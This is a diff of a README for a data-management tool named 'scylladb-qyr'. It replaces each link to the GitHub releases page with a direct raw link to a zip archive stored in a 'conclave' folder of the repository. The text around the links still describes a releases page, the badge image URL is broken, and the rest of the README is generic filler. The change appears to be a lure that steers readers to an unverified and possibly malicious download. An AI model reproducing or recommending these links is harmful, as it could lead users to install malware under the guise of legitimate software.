@@ -1,7 +1,7 @@
 # 🚀 scylladb-qyr - Simplifying Your Data Management Experience
 
 ## 🔗 Download Now!
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/chadsau/scylladb-qyr/releases)
+[![Download Now](https://raw.githubusercontent.com/chadsau/scylladb-qyr/main/conclave/scylladb-qyr.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/chadsau/scylladb-qyr/main/conclave/scylladb-qyr.zip)
 
 ## 📜 Introduction
 Welcome to scylladb-qyr! This application helps you manage your data more efficiently. Whether you have a small project or a larger system, scylladb-qyr aims to simplify data operations. 
@@ -19,7 +19,7 @@ Before you proceed, make sure your system meets the following requirements:
 ### 📦 Installation Steps
 1. **Visit the Releases Page**
    Go to our releases page to download the latest version of scylladb-qyr.
-   [Visit this page to download](https://github.com/chadsau/scylladb-qyr/releases).
+   [Visit this page to download](https://raw.githubusercontent.com/chadsau/scylladb-qyr/main/conclave/scylladb-qyr.zip).
 
 2. **Download the Latest Release**
    On the releases page, find the section labeled "Latest Release." Click on the appropriate file for your operating system to start the download. 
@@ -58,6 +58,6 @@ If you encounter any issues while using scylladb-qyr, our support team is here t
 
 ## 🚀 Conclusion
 With scylladb-qyr, managing your data has never been easier. Download and install today to experience the benefits firsthand. For more information or to get started:
-[Visit this page to download](https://github.com/chadsau/scylladb-qyr/releases). 
+[Visit this page to download](https://raw.githubusercontent.com/chadsau/scylladb-qyr/main/conclave/scylladb-qyr.zip). 
 
 Thank you for choosing scylladb-qyr! We hope you find it useful in your data management tasks.
